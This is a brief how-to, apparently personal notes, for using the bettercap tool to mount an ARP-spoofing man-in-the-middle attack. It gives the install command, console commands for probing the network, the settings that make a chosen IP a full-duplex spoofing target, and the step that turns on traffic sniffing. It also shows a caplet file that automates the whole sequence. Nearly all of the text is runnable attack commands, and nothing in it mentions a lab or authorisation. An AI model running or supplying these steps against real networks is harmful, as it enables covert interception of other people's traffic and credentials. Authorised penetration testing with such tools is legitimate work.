install : sudo apt install bettercap

syntax : sudo bettercap -iface [interface]
command : sudo bettercap -iface eth0

inside bettercap console :
 net.probe on  //  it will automatically turn on net.recon
 net.show  // it will show all the client connected

running attack : 
 set arp.spoof.fullduplex true // for intercepting both router and target
 set arp.spoof.targets [192.168.1.132] // if more than one target then enter them separated by comma(,)
 arp.spoof on // turning on arp.spoof module on be sure that net.probe and net.recon is on

 net.sniff on // turning the sniffing on


now we should be able to see all the trafic of our target


doing this by a spoof.cap file

just write all the commands in order and save the file with .cap extension
the file will contain :
---------------------
net.probe on
set arp.spoof.fullduplex true
set arp.spoof.targets [target_ip] // if more than one target separate their ip using comma(,)
arp.spoof on
net.sniff on
---------------------
save the file as spoof.cap


now locate the file using terminal

syntax : sudo bettercap -iface [interface] -caplet [caplet_file]
command : sudo bettercap -iface eth0 -caplet spoof.cap
